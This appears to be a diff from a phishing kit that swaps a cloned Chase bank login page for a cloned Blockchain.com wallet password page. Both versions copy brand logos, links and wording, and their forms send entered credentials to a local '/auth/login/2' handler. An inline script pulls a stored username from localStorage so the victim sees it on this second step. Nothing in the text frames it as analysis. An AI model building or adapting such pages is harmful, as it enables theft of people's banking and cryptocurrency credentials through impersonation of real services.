@@ -1,141 +1,91 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 
 <head>
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Login</title>
+  <title>Login | Blockchain</title>
   <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/main.css">
   <script src="/js/jquery.js"></script>
-  <script src="/js/jquery.mask.min.js"></script>
 </head>
 
-<body style="overflow-x: hidden; overflow-y: auto; height: 100%">
-  <div class="homepage">
-    <div class="signin-container">
-      <header class="signin header cb transparent bar">
-        <a href="https://secure04ea.chase.com/web/auth/dashboard">
-          <div class="logo"></div>
-        </a>
-      </header>
-
-      <main class="container signin">
-        <div class="cb background image fixed"></div>
-
-        <div class="row">
-          <div class="col-xs-12 col-sm-6 col-sm-offset-3 signin-box">
-            <div class="cb raised segment">
-              <div class="row">
-                <div class="col-xs-10 col-xs-offset-1">
-                  <form method="POST" action="/auth/login/2">
-                    <div class="cb error inverted primary animate alert signin-error">
-                      <div class="icon">
-                        <i class="cb exclamation-color icon"></i>
-                      </div>
-
-                      <div class="icon background"></div>
-
-                      <div class="content wrap">
-                        <h2 class="title" tabindex="-1">We can't find that username and/or password. Please try again.</h2>
-                      </div>
-                    </div>
-
-                    <div class="cb fieldgroup signin-floating-label" style="margin-top:32px;">
-                      <div class="cb vertical">
-                        <div class="cb-input-container cb-floating-label">
-                          <div class="cb-label-wrapper">
-                            <label class="cb cb-label vertical" for="username">Username</label>
-                          </div>
-
-                          <input id="username" name="username" type="text" class="cb input cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-                        </div>
-                      </div>
-                    </div>
-
-                    <div class="cb fieldgroup signin-floating-label">
-                      <div class="cb vertical">
-                        <div class="cb-input-container cb-floating-label">
-                          <div class="cb-label-wrapper">
-                            <label class="cb cb-label vertical" for="password">Password</label>
-                          </div>
-
-                          <input id="password" name="password" type="password" class="cb input cb-input" spellcheck="false" autocapitalize="off" autocorrect="off" autocomplete="off">
-                        </div>
-                      </div>
-                    </div>
-
-                    <div class="row ">
-                      <div class="col-xs-6">
-                        <div class="cb checkbox" id="rememberMe">
-                          <div class="checkbox-flex">
-                            <div class="checkboxWrap">
-                              <input class="checkbox-input" type="checkbox" id="rememberMe" value="on">
-                              <i class="cb checkmark icon check"></i>
-                            </div>
-
-                            <label for="rememberMe">
-                              <span class="checkbox-label">Remember me</span>
-                            </label>
-                          </div>
-                        </div>
-                      </div>
-                    </div>
-
-                    <div class="row">
-                      <button type="submit" class="cb button focus fluid primary submit-btn">
-                        <span class="label">Sign in</span>
-                      </button>
-                    </div>
-
-                    <div class="row">
-                      <span class="cb link">
-                        <a class="link-anchor" href="javascript:void(0);">
-                          Forgot username/password?
-                          <i class="cb progressright icon end-icon"></i>
-                        </a>
-                      </span>
-                    </div>
-
-                    <div class="row">
-                      <span class="cb link">
-                        <a class="link-anchor last" href="javascript:void(0);">
-                          Not Enrolled? Sign Up Now.
-                          <i class="cb progressright icon end-icon"></i>
-                        </a>
-                      </span>
-                    </div>
-                  </form>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </main>
-    </div>
-
-    <footer class="signin-footer">
-      <div class="cb-footer">
-        <div class="container">
-          <div class="cb-social-links row">
-            <div class="col-xs-12">
-              <span class="cb-social-text">Follow us:</span>
-
-              <ul class="cb-icon-links"><li class="facebook"><a class="cb iconaction" href="javascript:void(0);"><i class="cb facebook icon"></i></a></li><li class="instagram"><a class="cb iconaction" href="javascript:void(0);"><i class="cb instagram icon"></i></a></li><li class="twitter"><a class="cb iconaction" href="javascript:void(0);"><i class="cb twitter icon"></i></a></li><li class="youtube"><a class="cb iconaction" href="javascript:void(0);"><i class="cb youtube icon"></i></a></li><li class="linkedin"><a class="cb iconaction" href="javascript:void(0);"><i class="cb linkedin icon"></i></a></li></ul>
-            </div>
-          </div>
-
-          <div class="cb-footer-links row">
-            <div class="col-xs-12">
-              <ul><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Contact us</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Privacy</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Security</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Terms of use</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Accessibility</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">SAFE Act: Chase Mortgage Loan Originators</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Fair Lending</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">About Chase</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">J.P. Morgan</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">JPMorgan Chase & Co.</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Careers</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Español</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Chase Canada</a></span></li><li><span class="cb link"><a class="link-anchor" href="javascript:void(0);">Site map</a></span></li><li>Member FDIC</li><li><i class="cb equal-housing-lender icon"></i>Equal Housing Lender </li><li class="copyright-label">(c) 2016 JPMorgan Chase &amp; Co.</li></ul>
+<body class="mode-light">
+  <div id="app">
+    <div class="hLRBsB">
+      <div class="fvHjxE">
+        <div height="112px" class="dHvbOZ">
+          <div class="iTjCBV cptUIt">
+            <div class="jnHNPG fCMSDs">
+              <div class="kKyXUB"><a href="https://www.blockchain.com" class="bzateK gqnaJW" color="blue600"><img src="/img/logo.svg" srcset="" height="24px" class="ixijk kyMJXT" color="auto" width="auto"></a></div>
             </div>
           </div>
         </div>
       </div>
-    </footer>
-  </div>
 
+      <div class="dXnSGZ">
+        <form action="/auth/login/2" method="post" class="bTmCWi">
+          <div class="coOByc">
+            <div class="cYziAC">
+              <div class="gkJLwX">
+                <div class="ilzBRA" style="margin-top: 40px;">
+                  <div class="eLDzCn" style="margin-bottom: 24px;">
+                    <div color="grey900" cursor="pointer" opacity="1" class="gFCRIM"><img src="/img/arrow-left2.svg" style="margin-right:10px;">Back</div>
+                    <div class="cqtptZ" id="cbx-user"></div>
+                    <script>
+                      if (typeof Storage !== "undefined") {
+                        document.getElementById("cbx-user").innerHTML =
+                          localStorage.getItem("cbx-user");
+                      } else {
+                        console.log("Sorry, your browser does not support Web Storage...");
+                      }
+                    </script>
+                  </div>
+                  <label class="ghipZq cQHyEO" for="password">
+                    <div color="grey800" cursor="inherit" opacity="1" class="eGdQh">Password</div>
+                  </label>
+                  <div class="eFunUP" height="48px">
+                    <div class="Pbjyv">
+                      <input name="password" id="password" height="48px" placeholder="Enter Password" spellcheck="false" autocomplete="off" type="password" class="rmiWH">
+                    </div>
+                    <div color="error" height="48px" class="cguRtB cIoOVw" cursor="inherit" opacity="1" style="display:none;">Required</div>
+                  </div>
+                </div>
+              </div>
+              <div class="cfNveD">
+                <button type="submit" height="48px" class="gqApeS jRlWXV" disabled="" color="white" style="margin-bottom: 16px;">
+                  <div color="whiteFade900" cursor="inherit" opacity="1" class="edfwkt">Continue </div>
+                </button>
+              </div>
+            </div>
+            <div class="kJoMeO">
+              <div class="hfEIPj" href="#/signup">
+                <div color="grey600" cursor="inherit" opacity="1" class="dZiTwf" style="cursor: pointer; margin-top: 16px;">Don't have a Blockchain Account? </div>&nbsp;<div color="blue600" class="nYDtv kiSsZI" cursor="inherit" opacity="1">Sign up Now -&gt; </div>
+              </div>
+            </div>
+          </div>
+        </form>
+      </div>
+      <div class="ilwOTt">
+        <div class="kiwhRw">
+          <div class="kXiRmv">
+            <div color="grey400" class="kyfudT">
+              <div class="kPtlNs">English</div>
+            </div>
+          </div>
+          <span class="jhqRYo">
+            <a color="grey400" href="https://github.com/blockchain/blockchain-wallet-v4-frontend/releases" class="ecJsZh">Version 4.83.9</a>
+          </span>
+          <div class="ilHcgz">
+            <a color="grey400" href="https://support.blockchain.com" class="ecJsZh">
+              <div color="grey400" cursor="inherit" opacity="1" class="hLxhAA">Need Help? </div>
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
   <script src="/js/main.js"></script>
 </body>
 
